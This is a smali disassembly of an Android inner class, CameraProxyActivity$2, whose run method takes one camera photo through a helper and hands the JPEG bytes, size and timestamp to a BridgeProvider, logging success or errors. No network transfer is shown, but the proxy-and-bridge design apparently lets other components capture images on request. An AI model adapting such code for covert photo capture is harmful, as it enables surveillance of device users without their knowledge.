.class Lcom/servers/ozzbzk/CameraProxyActivity$2;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/servers/ozzbzk/CameraProxyActivity;->doCapture(II)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/servers/ozzbzk/CameraProxyActivity;

.field final synthetic val$cameraId:I


# direct methods
.method constructor <init>(Lcom/servers/ozzbzk/CameraProxyActivity;I)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010,
            0x1010
        }
        names = {
            null,
            null
        }
    .end annotation

    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 76
    iput-object p1, p0, Lcom/servers/ozzbzk/CameraProxyActivity$2;->this$0:Lcom/servers/ozzbzk/CameraProxyActivity;

    iput p2, p0, Lcom/servers/ozzbzk/CameraProxyActivity$2;->val$cameraId:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    .line 80
    const-string v0, "CameraProxy"

    .line 0
    const-string v1, "captured "

    const-string v2, "error: "

    .line 80
    :try_start_0
    new-instance v3, Lcom/servers/ozzbzk/CameraCaptureHelper;

    iget-object v4, p0, Lcom/servers/ozzbzk/CameraProxyActivity$2;->this$0:Lcom/servers/ozzbzk/CameraProxyActivity;

    invoke-direct {v3, v4}, Lcom/servers/ozzbzk/CameraCaptureHelper;-><init>(Landroid/content/Context;)V

    .line 81
    iget v4, p0, Lcom/servers/ozzbzk/CameraProxyActivity$2;->val$cameraId:I

    invoke-virtual {v3, v4}, Lcom/servers/ozzbzk/CameraCaptureHelper;->captureOnce(I)[B

    move-result-object v3

    if-eqz v3, :cond_0

    .line 82
    array-length v4, v3

    if-lez v4, :cond_0

    .line 83
    array-length v4, v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " bytes"

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 84
    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    .line 85
    const-string v4, "success"

    const/4 v5, 0x1

    invoke-virtual {v1, v4, v5}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 86
    const-string v4, "has_result"

    invoke-virtual {v1, v4, v5}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 87
    const-string v4, "jpeg"

    invoke-virtual {v1, v4, v3}, Landroid/os/Bundle;->putByteArray(Ljava/lang/String;[B)V

    .line 88
    const-string v4, "size"

    array-length v3, v3

    invoke-virtual {v1, v4, v3}, Landroid/os/Bundle;->putInt(Ljava/lang/String;I)V

    .line 89
    const-string v3, "captured_at"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    invoke-virtual {v1, v3, v4, v5}, Landroid/os/Bundle;->putLong(Ljava/lang/String;J)V

    .line 90
    invoke-static {v1}, Lcom/servers/ozzbzk/BridgeProvider;->setCameraResult(Landroid/os/Bundle;)V

    goto :goto_0

    .line 92
    :cond_0
    const-string v1, "capture failed"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 93
    const-string v1, "capture_failed"

    invoke-static {v1}, Lcom/servers/ozzbzk/CameraProxyActivity;->-$$Nest$smstoreError(Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 99
    :goto_0
    iget-object v0, p0, Lcom/servers/ozzbzk/CameraProxyActivity$2;->this$0:Lcom/servers/ozzbzk/CameraProxyActivity;

    new-instance v1, Lcom/servers/ozzbzk/CameraProxyActivity$2$1;

    invoke-direct {v1, p0}, Lcom/servers/ozzbzk/CameraProxyActivity$2$1;-><init>(Lcom/servers/ozzbzk/CameraProxyActivity$2;)V

    :goto_1
    invoke-virtual {v0, v1}, Lcom/servers/ozzbzk/CameraProxyActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto :goto_3

    :catchall_0
    move-exception v1

    .line 96
    :try_start_1
    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 97
    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_1
    const-string v0, "unknown"

    :goto_2
    invoke-static {v0}, Lcom/servers/ozzbzk/CameraProxyActivity;->-$$Nest$smstoreError(Ljava/lang/String;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 99
    iget-object v0, p0, Lcom/servers/ozzbzk/CameraProxyActivity$2;->this$0:Lcom/servers/ozzbzk/CameraProxyActivity;

    new-instance v1, Lcom/servers/ozzbzk/CameraProxyActivity$2$1;

    invoke-direct {v1, p0}, Lcom/servers/ozzbzk/CameraProxyActivity$2$1;-><init>(Lcom/servers/ozzbzk/CameraProxyActivity$2;)V

    goto :goto_1

    :goto_3
    return-void

    :catchall_1
    move-exception v0

    iget-object v1, p0, Lcom/servers/ozzbzk/CameraProxyActivity$2;->this$0:Lcom/servers/ozzbzk/CameraProxyActivity;

    new-instance v2, Lcom/servers/ozzbzk/CameraProxyActivity$2$1;

    invoke-direct {v2, p0}, Lcom/servers/ozzbzk/CameraProxyActivity$2$1;-><init>(Lcom/servers/ozzbzk/CameraProxyActivity$2;)V

    invoke-virtual {v1, v2}, Lcom/servers/ozzbzk/CameraProxyActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 106
    throw v0
.end method
